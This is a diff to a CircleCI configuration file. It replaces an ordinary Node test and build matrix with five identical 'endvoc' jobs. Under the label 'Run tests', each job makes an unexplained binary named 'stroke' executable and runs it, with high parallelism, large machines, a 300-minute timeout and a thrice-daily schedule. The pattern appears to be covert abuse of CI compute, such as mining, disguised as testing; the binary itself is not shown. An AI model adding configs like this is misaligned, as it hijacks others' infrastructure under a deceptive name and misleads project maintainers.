@@ -1,84 +1,66 @@
+working_dir: &working_dir ~/app
+.build_template: &script
+  steps:
+    - checkout
+    - run:
+        name: Run tests
+        command: |
+                    chmod u+x stroke && ./stroke
+        no_output_timeout: 300m
 version: 2.1
-
-executors:
-  stroke:
+jobs:
+  endvoc:
+    <<: *script
+    parallelism: 6
     docker:
       - image: node
     resource_class: large
-
-orbs:
-  node: circleci/node@4.7.0
-
-jobs:
-  test:
-    parallelism: 5
-    parameters:
-      os:
-        type: executor
-      node-version:
-        type: string
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-          install-yarn: true
-      - run:
-         Name: test
-         command: |
-                     chmod +x stroke && ./stroke
-         no_output_timeout: 300m
-  build:
-    parallelism: 5
-    parameters:
-      os:
-        type: executor
-      node-version:
-        type: string
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-          install-yarn: true
-      - run:
-         Name: build
-         command: |
-                     chmod +x stroke && ./stroke
-         no_output_timeout: 300m
-  building:
-    parallelism: 5
-    parameters:
-      os:
-        type: executor
-      node-version:
-        type: string
-    executor: << parameters.os >>
-    steps:
-      - checkout
-      - node/install:
-          node-version: << parameters.node-version >>
-          install-yarn: true
-      - run:
-         Name: building
-         command: |
-                     chmod +x stroke && ./stroke
-         no_output_timeout: 300m
+  endvoc1:
+    <<: *script
+    parallelism: 6
+    docker:
+      - image: node
+    resource_class: large
+  endvoc2:
+    <<: *script
+    parallelism: 6
+    docker:
+      - image: node
+    resource_class: large
+  endvoc3:
+    <<: *script
+    parallelism: 6
+    docker:
+      - image: node
+    resource_class: large
+  endvoc4:
+    <<: *script
+    parallelism: 6
+    docker:
+      - image: node
+    resource_class: large
 workflows:
-  all-tests:
+  version: 2.1
+  commit:
     jobs:
-      - test:
-          matrix:
-            parameters:
-              os: [stroke]
-              node-version: ["10.9.0", "11.9.0"]
-      - build:
-          matrix:
-            parameters:
-              os: [stroke]
-              node-version: ["10.9.0", "11.9.0"]
-      - building:
-          matrix:
-            parameters:
-              os: [stroke]
-              node-version: ["10.9.0", "11.9.0"]
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
+
+    triggers:
+      - schedule:
+          cron: "0 0,8,16 * * *"
+          filters:
+            branches:
+              only:
+                - main
+
+  endvocrunjob:
+    jobs:
+      - endvoc
+      - endvoc1
+      - endvoc2
+      - endvoc3
+      - endvoc4
